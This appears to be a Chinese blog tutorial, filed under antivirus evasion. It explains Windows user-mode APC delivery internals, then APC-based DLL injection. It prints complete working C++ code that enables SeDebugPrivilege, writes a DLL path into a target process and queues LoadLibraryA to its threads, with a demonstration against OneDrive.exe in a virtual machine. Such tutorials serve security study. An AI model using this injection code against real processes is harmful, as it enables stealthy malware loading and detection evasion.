<p>1.首先判断参数是否为1，当参数为1的时候处理用户APC。再判断Apcstate.UserApcPending是否为1，为1则有用户APC要执行。</p>
<p>2.将ApcState.UserApcPending设置为0.</p>
<p>3.链表操作，将当前APC从用户队列中移除。</p>
<p>4.调用函数(KAPC.KernelRoutine)释放KAPC结构内存空间</p>
<p>5.转到 KiInitializeUserApc 函数，将 CONTEXT 和 TrapFrame 传入 KeContextFromKframes</p>
<p>6.当windows把 CONTEXT 结构复制到堆栈之后，准备用户层执行环境，首先修改SS、DS、ES、FS、GS和EFLAGS寄存器</p>
<p>7.然后修改esp到3环堆栈</p>
<p>8.然后修改eip，这里永远返回一个固定的位置，但是这个位置在每次系统启动的时候都不相同，存放在3环的 ntdll 里的 KiUserApcDispatcher 参数里面</p>
<p>9.然后到ntdll里面定位到 KiUserApcDispatcher ，首先得到指向 CONTEXT 结构的指针，然后 pop eax 得 到 NormalRoutine 结构，这里当APC是内核APC的时候存储的是真正的APC地址，当APC是用户APC的时候存储的是指向用户APC的总入口。当我们调用 QueueUserAPC ，并没有指定 NormalRoutine 结构，只指定了 NormalContext 和 SystemArgument1 ，那么这个参数在 QueueUserAPC 内部指定，在 kernel32.dll 的 BaseDispatchAPC ，用来调用真正的用户APC函数。</p>
<p>10.调用ZwContinue 。</p>
<p>（1）返回内核，如果还有用户APC，重复上面的执行过程。 </p>
<p>（2）如果没有需要执行的用户APC，会将CONTEXT赋值给Trap_Frame结构体。就像从来没有修改过一样。 ZwContinue后面的代码不会执行，线程从哪里进0环仍然会从哪里回去。</p>
<p>11.使用 0x20 的调用号利用调用门回到0环。</p>
<h1 id="二、apc注入"><a href="#二、apc注入" class="headerlink" title="二、apc注入"></a>二、apc注入</h1><h2 id="2-1步骤"><a href="#2-1步骤" class="headerlink" title="2.1步骤"></a>2.1步骤</h2><p>1.当EXE里某个线程执行到SleepEx()或者WaitForSingleObjectEx()时，系统就会产生一个软中断（或者是Messagebox弹窗的时候不点OK的时候也能注入）。</p>
<p>2.当线程再次被唤醒时，此线程会首先执行APC队列中的被注册的函数。</p>
<p>3.利用QueueUserAPC()这个API可以在软中断时向线程的APC队列插入一个函数指针，如果我们插入的是Loadlibrary()执行函数的话，就能达到注入DLL的目的。</p>
<p>在整个执行过程中，线程并无任何异常举动，不容易被察觉，但缺点是对于单线程程序一般不存在挂起状态，所以APC注入对于这类程序没有明显效果。</p>
<h2 id="2-2流程"><a href="#2-2流程" class="headerlink" title="2.2流程"></a>2.2流程</h2><p>1.OpenProcess 打开进程</p>
<p>2.VirtualAlloc 申请空间</p>
<p>3.WriteProcessMemory 写入dll信息</p>
<p>4.根据进程对应的线程id打开线程</p>
<p>5.使用 QueueUserApc 插入执行</p>
<h2 id="2-3代码实现"><a href="#2-3代码实现" class="headerlink" title="2.3代码实现"></a>2.3代码实现</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include&lt;Windows.h&gt;</span><br><span class="line">#include&lt;TlHelp32.h&gt;</span><br><span class="line">#include&lt;tchar.h&gt;</span><br><span class="line"></span><br><span class="line">//提权函数</span><br><span class="line">BOOL EnableDebugPrivilege() &#123;</span><br><span class="line">	HANDLE hToken;</span><br><span class="line">	BOOL fok = FALSE;</span><br><span class="line">	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &amp;hToken)) &#123;</span><br><span class="line">		TOKEN_PRIVILEGES tp;</span><br><span class="line">		tp.PrivilegeCount = 1;</span><br><span class="line">		LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &amp;tp.Privileges[0].Luid);</span><br><span class="line">		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;</span><br><span class="line">		AdjustTokenPrivileges(hToken, FALSE, &amp;tp, sizeof(tp), NULL, NULL);</span><br><span class="line">		fok = (GetLastError() == ERROR_SUCCESS);</span><br><span class="line">		CloseHandle(hToken);</span><br><span class="line">	&#125;</span><br><span class="line">	return fok;</span><br><span class="line">&#125;</span><br><span class="line">BOOL APCInjectDLL(DWORD dwPid, char* pszDllName) &#123;</span><br><span class="line">	EnableDebugPrivilege(); </span><br><span class="line">	//打开进程,获取进程句柄</span><br><span class="line">	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);</span><br><span class="line">	if (hProcess == NULL) &#123; return FALSE; &#125;</span><br><span class="line">	//向目标进程申请空间写入dll全路径 </span><br><span class="line">	int nSize = strlen(pszDllName);</span><br><span class="line">	LPVOID pDllAddr = VirtualAllocEx(hProcess, NULL, nSize, MEM_COMMIT, PAGE_READWRITE); </span><br><span class="line">	SIZE_T dwWrittenSize = 0; </span><br><span class="line">	WriteProcessMemory(hProcess, pDllAddr, pszDllName, nSize, &amp;dwWrittenSize); </span><br><span class="line">	//获取LoadLibraryA的地址</span><br><span class="line">	HMODULE hMod = GetModuleHandleA(&quot;kernel32.dll&quot;);</span><br><span class="line">	FARPROC pFuncAddr = GetProcAddress(hMod, &quot;LoadLibraryA&quot;); </span><br><span class="line">	//创建线程快照</span><br><span class="line">	THREADENTRY32 te = &#123; 0 &#125;; </span><br><span class="line">	te.dwSize = sizeof(te);</span><br><span class="line">	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, NULL);</span><br><span class="line">	if (hSnap == INVALID_HANDLE_VALUE) &#123; return FALSE; &#125;</span><br><span class="line">	DWORD dwRet = 0;</span><br><span class="line">	HANDLE hThread = NULL; </span><br><span class="line">	if (Thread32First(hSnap, &amp;te)) &#123; </span><br><span class="line">		do &#123;</span><br><span class="line">			if (te.th32OwnerProcessID == dwPid) &#123;</span><br><span class="line">				hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);</span><br><span class="line">				if (hThread) &#123;</span><br><span class="line">					dwRet = QueueUserAPC((PAPCFUNC)pFuncAddr, hThread, (ULONG_PTR)pDllAddr);</span><br><span class="line">					hThread = NULL;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; while (Thread32Next(hSnap, &amp;te));</span><br><span class="line">	&#125;</span><br><span class="line">	CloseHandle(hThread);</span><br><span class="line">	CloseHandle(hProcess); </span><br><span class="line">	CloseHandle(hSnap); </span><br><span class="line">	return TRUE;</span><br><span class="line">&#125;int main(int argc, char* argv[]) &#123; </span><br><span class="line">	if (argc == 3) &#123; </span><br><span class="line">		if (FALSE == APCInjectDLL((DWORD)_tstol(argv[1]), argv[2])) </span><br><span class="line">			printf(&quot;APCInject failed\n&quot;); else</span><br><span class="line">			printf(&quot;APCInject successfully\n&quot;); </span><br><span class="line">	&#125; else &#123;</span><br><span class="line">		printf(&quot;\nUsage: %s &lt;PID&gt; &lt;Dllpath&gt;\n&quot;);</span><br><span class="line">		printf(&quot;Example: %s 520 C:\\test.dll\n&quot;); </span><br><span class="line">	&#125;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>将程序和要注入的dll放入虚拟机。在cmd中使用tasklist命令查看进程id。</p>
<p><img src="/images/APC%E6%B3%A8%E5%85%A5/image-20230912111408508.png" alt="image-20230912111408508"></p>
<p>找到一个OneDrive.exe,PID为5776</p>
<p>输入命令注入，结果如图：</p>
<p><img src="/images/APC%E6%B3%A8%E5%85%A5/image-20230912111646582.png" alt="image-20230912111646582"></p>
<h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>本篇简单介绍了apc注入的基本概念和流程，如果有哪里讲述不对的地还望各位大佬赐教。</p>
]]></content>
      <categories>
        <category>免杀基础</category>
      </categories>
      <tags>
        <tag>免杀</tag>
      </tags>
  </entry>
</search>
